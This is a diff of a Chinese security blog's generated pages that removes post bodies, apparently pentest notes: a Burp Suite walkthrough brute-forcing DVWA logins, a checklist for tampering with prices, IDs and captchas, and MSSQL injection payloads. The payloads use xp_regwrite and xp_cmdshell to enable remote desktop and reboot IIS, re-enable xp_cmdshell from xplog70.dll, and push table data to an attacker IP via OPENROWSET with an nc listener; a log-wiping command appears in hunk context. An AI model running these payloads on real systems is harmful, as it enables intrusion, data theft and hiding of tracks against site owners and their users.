-<h2 id="3、Intruder-入侵"><a href="#3、Intruder-入侵" class="headerlink" title="3、Intruder(入侵)"></a>3、Intruder(入侵)</h2><p>Burp Intruder可以用于利用漏洞,模糊测试,暴力猜解等。在这种情况下我们将使用Burp Suite的Intruder对DVWA进行暴力猜解攻击.浏览到DVWA,单击”Burp Force(暴力猜解)”,随便输入username和password,确保Burp Suite上的”intercept is on(监听是打开的)”.然后点击登陆.<br>登陆请求将被Burp Suite监听拦截到,然后右键单击”send to intruder(发送给入侵者功能)”<br>以上的操作会将请求信息发送给intruder功能.进入intruder标签,配置Burp Suite来发起暴力猜解的攻击.在target标签下可以看到已经设置好了要请求攻击的目标<br>进入positions(选项)标签,我们可以看到之前发送给Intruder的请求.一些重要的信息用其它颜色显示.基本上是由Burp Suite进行猜解,是为了弄明白暴力猜解的这些请求中什么是发生改变的. 这种情况下只有用户和密码是不停的发生改变.我们需要相应的配置Burp.<br>单击右边的”clear”按钮,将会删除所有用不同颜色演示的重要的信息.接下来我们需要配置Burp在这次攻击中只把用户名和密码做为参数.选中本次请求中的username(本例中用户名是指”infosecinstiture”)然后单击”Add(添加)”.同样的将本次请求中的password也添加进去.这样操作之后,用户名和密码将会成为第一个和第二个参数.一旦你操作完成,输出的样子应该如下图所示:<br>接下来我们需要设置这次攻击的攻击类型,默认情况下的攻击类型是”Sniper(狙击手)”,在本例中，我们将使用”Cluster Bomb(集束炸弹)”的攻击类型.有四种攻击类型，分别是singer,battering ram,pitchfork,cluster bomb.下图中我们看到的我们的攻击类型是”Cluster Bomb’<br>进入payload标签,确保”payload set”的值是1,点击”load(加载)”加载一个包含用户名的文件 。本例中我们使用一个很小的文件来进行演示.加载之后用户名文件中的用户名会如下图所示<br>同样设置”payload set”的值为2,点击”load”加载一个密码字典文件。<br>进入”options”标签,确保results下的”store requests”和”store responses”已经选择.<br>点击左上角的”Intruder”开始攻击,会看到弹出一个windows窗口,其中有我们制作好的所有请求。<br>我们如何确定哪一个登陆请求是成功的呢？通过一个成功的请求相比不成功的，是有一个不同的响应状态.在这种情况下,我们看到的用户名”admin”和密码”password”的响应长度相比其它的请求，有所不同.<br>根据不同的响应请求，点击”request”.如果点击”response”选项,我们看到文字”welcome the password protected area admin”出现在响应中,这意味着这次请求中使用的username/password是正确的.<br>Burp的入侵功能是Burp Suite最强大的功能之一.我们要仔细的学习它的使用.</p>
-<h2 id="4、Repeater-中继转发"><a href="#4、Repeater-中继转发" class="headerlink" title="4、Repeater(中继转发)"></a>4、Repeater(中继转发)</h2><p>通过Burp Repeater功能,我们可以手动修改一个请求,并且发送出去,来分析返回的响应.我们需要从不同的地方发送请求给Burp Repeater,比如入侵者，代理等.发送一个请求给Repeater，只需要单击右键”send to Repeater”.<br>点开Repeater标签,会看到request，也可以看到名为1，2，3的3个标签.<br>我们也可以看到requestparams,header,hex和raw格式的请求,发送请求之前,我们可以修改其中的任何一个.<br>只修改Params请求下的username=admin，password=password，点击go,这样就会发送这个请求.<br>我们可以分析response部分返回的响应.</p>
-<h3 id="其余的功能还在摸索中，主要是我不长用到的，那天在做一下总结。"><a href="#其余的功能还在摸索中，主要是我不长用到的，那天在做一下总结。" class="headerlink" title="其余的功能还在摸索中，主要是我不长用到的，那天在做一下总结。"></a>其余的功能还在摸索中，主要是我不长用到的，那天在做一下总结。</h3>
       
     </div>
     <footer>
       
+        
+          <div class="alignleft">
+            <a href="/2016/07/28/26/#more" class="more-link">Read More</a>
+          </div>
         
         
       
@@ -264,14 +232,14 @@ echo &gt; /var/log/lastlog
 <h2 id="0x01-身份认证安全"><a href="#0x01-身份认证安全" class="headerlink" title="0x01 身份认证安全"></a>0x01 身份认证安全</h2><p>1，暴力破解<br>在没有验证码限制或者一次验证码可以多次使用的地方，使用已知用户对密码进行暴力破解或者用一个通用密码对用户进行暴力破解。 简单的验证码爆破。<br>基本工具：Burpsuite、hydry<br>2 session &amp; cookie类<br>会话固定攻击：利用服务器的session不变机制，借他人之手获得认证和授权，冒充他人。<br>Cookie仿冒：修改cookie中的某个参数可以登录其他用户。<br>3 弱加密<br>未使用https，是功能测试点，不好利用。<br>前端加密，用密文去后台校验，并利用smart decode可解</p>
 <h2 id="0x02-业务一致性安全"><a href="#0x02-业务一致性安全" class="headerlink" title="0x02 业务一致性安全"></a>0x02 业务一致性安全</h2><p>1，手机号篡改<br>抓包修改手机号码参数为其他号码尝试，例如在找回密码页面，抓包改包修改手机号码参数为其他人号码，查看是否能找回其他人的业务。<br>2，邮箱或者用户篡改<br>抓包修改用户或者邮箱参数为其他用户或者邮箱<br>3，订单id篡改<br>查看自己的订单id，然后修改id查看是否能查看其它订单信息。<br>4，用户id篡改<br>抓包查看自己的用户id，然后修改id查看是否能查看其它用户id信息。</p>
 <h2 id="0x03-业务数据篡改"><a href="#0x03-业务数据篡改" class="headerlink" title="0x03 业务数据篡改"></a>0x03 业务数据篡改</h2><p>1，金额数据篡改<br>抓包修改金额等字段，比如在支付页面抓取请求中商品的金额字段，修改成任意数额的金额并提交，查看能否以修改后的金额数据完成业务流程。<br>2，商品数量篡改<br>抓包修改商品数量等字段，将请求中的商品数量修改成任意数额，如负数并提交，查看能否以修改后的数量完成业务流程。<br>3，最大数限制突破<br>很多商品限制用户购买数量时，服务器仅在页面通过js脚本限制，未在服务器端校验用户提交的数量，通过抓包修改商品最大数限制，将请求中的商品数量改为大于最大数限制的值，查看能否以修改后的数量完成业务流程。<br>4，本地js参数修改<br>部分应用程序通过Javascript处理用户提交的请求，通过修改Javascript脚本，测试修改后的数据是否影响到用户。</p>
-<h2 id="0x04-密码找回漏洞"><a href="#0x04-密码找回漏洞" class="headerlink" title="0x04 密码找回漏洞"></a>0x04 密码找回漏洞</h2><p>1，密码找回逻辑测试一般流程<br>首先尝试正常密码找回流程，选择不同找回方式，记录所有数据包<br>分析数据包，找到敏感部分<br>分析后台找回机制所采用的验证手段<br>修改数据包验证推测</p>
-<h2 id="0x06-验证码突破"><a href="#0x06-验证码突破" class="headerlink" title="0x06 验证码突破"></a>0x06 验证码突破</h2><p>1，验证码暴力破解测试<br>使用burp对特定的验证码进行暴力破解<br>2，验证码时间、次数测试<br>抓取携带验证码的数据包不断重复提交。<br>3，验证码客户端回显测试<br>当客户端有需要和服务器进行交互，发送验证码时，即可使用firefox按F12调出firebug就可看到客户端与服务器进行交互的详细信息<br>4，验证码绕过测试<br>当第一步向第二步跳转时，抓取数据包，对验证码进行篡改清空测试，验证该步骤验证码是否可以绕过。<br>5，验证码js绕过<br>短信验证码验证程序逻辑存在缺陷，业务流程的第一步、第二部、第三步都是放在同一个页面里，验证第一步验证码是通过js来判断的，可以修改验证码在没有获取验证码的情况下可以填写实名信息，并且提交成功。</p>
-<h2 id="0x07-业务授权安全"><a href="#0x07-业务授权安全" class="headerlink" title="0x07 业务授权安全"></a>0x07 业务授权安全</h2><p>1，未授权访问<br>非授权访问是指用户在没有通过认证授权的情况下能够直接访问需要通过认证才能访问到的页面或文本信息。可以尝试在登录某网站前台或后台之后，将相关的页面链接复制于其他浏览器或其他电脑上进行访问，看是否能访问成功。<br>2，越权访问<br>越权漏洞的成因主要是因为开发人员在对数据进行增、删、改、查询时对客户端请求的数据过分相信而遗漏了权限的判定<br>垂直越权（垂直越权是指使用权限低的用户可以访问权限较高的用户）<br>水平越权（水平越权是指相同权限的不同用户可以互相访问）</p>
-
       
     </div>
     <footer>
       
+        
+          <div class="alignleft">
+            <a href="/2016/07/28/25/#more" class="more-link">Read More</a>
+          </div>
         
         
       
@@ -315,24 +283,15 @@ and (select IS_MEMBER(‘public’))=1–  //public
 ;declare @r varchar(255) set @r=’HKEY_LOCAL_MACHINE’exec master..xp_regwrite @r,’system\currentcontrolset\services\termservice’,’start’,’reg_dword’,2;—-
 ;declare @r varchar(255) set @r=’HKEY_LOCAL_MACHINE’exec master..xp_regwrite ‘hkey_users’,’.default\keyboard layout\toggle’,’hotkey’,’reg_sz’,’1′;—-
 ;declare @r varchar(255) set @r=’HKEY_LOCAL_MACHINE’exec master..xp_cmdshell ‘iisreset /reboot’;—-
-</code></pre><h2 id="xp-cmdshell的删除及恢复"><a href="#xp-cmdshell的删除及恢复" class="headerlink" title="xp_cmdshell的删除及恢复"></a>xp_cmdshell的删除及恢复</h2><h4 id="1、恢复xp-cmdshell的方法"><a href="#1、恢复xp-cmdshell的方法" class="headerlink" title="1、恢复xp_cmdshell的方法"></a>1、恢复xp_cmdshell的方法</h4><p>删除扩展存储过过程xp_cmdshell的语句   </p>
-<pre><code>exec sp_dropextendedproc ’xp_cmdshell’  
-</code></pre><h4 id="2、恢复cmdshell的sql语句"><a href="#2、恢复cmdshell的sql语句" class="headerlink" title="2、恢复cmdshell的sql语句"></a>2、恢复cmdshell的sql语句</h4><pre><code>exec sp_addextendedproc xp_cmdshell ,@dllname =’xplog70.dll’  
-exec master.dbo.addextendedproc ’xp_cmdshell’,’xplog70.dll’;select count(*) from master.dbo.sysobjects where xtype=’x’ and   
-</code></pre><p>返回结果为1就ok<br>否则需上传c:\inetput\web\xplog70.dll后   </p>
-<pre><code>exec master.dbo.sp_addextendedproc ’xp_cmdshell’,’c:\inetput\web\xplog70.dll’;–  
-</code></pre><h4 id="3、如果是用以下方法删除"><a href="#3、如果是用以下方法删除" class="headerlink" title="3、如果是用以下方法删除"></a>3、如果是用以下方法删除</h4><pre><code>drop procedure sp_addextendedproc   
-drop procedure sp_oacreate   
-exec sp_dropextendedproc ’xp_cmdshell’  
-</code></pre><p>则可以用以下语句恢复   </p>
-<pre><code>dbcc addextendedproc (“sp_oacreate”,”odsole70.dll”)   
-dbcc addextendedproc (“xp_cmdshell”,”xplog70.dll”)   
-</code></pre><p>这样可以直接恢复，不用去管sp_addextendedproc是不是存在</p>
-<h2 id="在db权限并且分离获取mssql数据库服务器ip的方法"><a href="#在db权限并且分离获取mssql数据库服务器ip的方法" class="headerlink" title="在db权限并且分离获取mssql数据库服务器ip的方法"></a>在db权限并且分离获取mssql数据库服务器ip的方法</h2><h4 id="1-本地nc监听-nc-vvlp-80"><a href="#1-本地nc监听-nc-vvlp-80" class="headerlink" title="1.本地nc监听  nc -vvlp 80"></a>1.本地nc监听  nc -vvlp 80</h4><h4 id="2-insert-into-OPENROWSET-‘SQLOLEDB’-’uid-sa-pwd-xxx-Network-DBMSSOCN-Address-你的ip-80-’-‘select-from-dest-table’-select-from-src-table-–"><a href="#2-insert-into-OPENROWSET-‘SQLOLEDB’-’uid-sa-pwd-xxx-Network-DBMSSOCN-Address-你的ip-80-’-‘select-from-dest-table’-select-from-src-table-–" class="headerlink" title="2.;insert into OPENROWSET(‘SQLOLEDB’,’uid=sa;pwd=xxx;Network=DBMSSOCN;Address=你的ip,80;’, ‘select  from dest_table’) select  from src_table;–"></a>2.;insert into OPENROWSET(‘SQLOLEDB’,’uid=sa;pwd=xxx;Network=DBMSSOCN;Address=你的ip,80;’, ‘select <em> from dest_table’) select </em> from src_table;–</h4>
+</code></pre>
       
     </div>
     <footer>
       
+        
+          <div class="alignleft">
+            <a href="/2016/07/28/24/#more" class="more-link">Read More</a>
+          </div>
         
         
       
